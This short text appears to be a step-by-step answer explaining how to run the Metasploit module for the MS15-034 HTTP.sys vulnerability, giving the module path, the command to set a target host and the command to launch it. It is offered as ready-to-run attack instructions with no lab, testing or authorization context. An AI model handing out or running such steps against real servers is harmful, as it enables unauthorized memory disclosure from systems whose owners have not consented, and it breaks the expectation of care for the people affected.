Use the following tool in Metasploit:

```bash
use auxiliary/scanner/http/ms15_034_http_sys_memory_dump
```

To configure the exploit, you must set the following required options:

```bash
set RHOSTS <your target host(s) here>
```

After setting the required options, run the exploit:
```bash
exploit
```
Note:
1. Please execute the command step by step.
2. You can use the `show options` command to view the parameters